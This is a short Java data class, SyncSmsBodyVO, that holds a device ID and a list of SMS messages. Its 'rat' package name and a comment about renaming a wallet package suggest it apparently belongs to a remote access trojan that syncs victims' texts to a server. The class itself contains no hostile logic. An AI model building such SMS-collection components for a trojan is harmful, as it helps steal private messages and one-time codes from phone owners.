package com.vendor.rat.model.resp;
// ADAPT: package com.guard.wallet.resp -> com.vendor.rat.model.resp
import androidx.annotation.NonNull;
import com.vendor.rat.model.req.MessageBodyVO;
import java.util.List;
public class SyncSmsBodyVO extends MessageBodyVO {
    private String deviceId;
    private List<SmsMessageVO> messages;
    public SyncSmsBodyVO() {
    }
    public SyncSmsBodyVO(String str, List<SmsMessageVO> list) {
        this.deviceId = str;
        this.messages = list;
    }
    public String getDeviceId() { return this.deviceId; }
    public List<SmsMessageVO> getMessages() { return this.messages; }
    public void setDeviceId(String str) { this.deviceId = str; }
    public void setMessages(List<SmsMessageVO> list) { this.messages = list; }
    @NonNull
    public String toString() {
        return "SmsBodyVO{deviceId='" + this.deviceId + "', messages=" + this.messages + '}';
    }
}
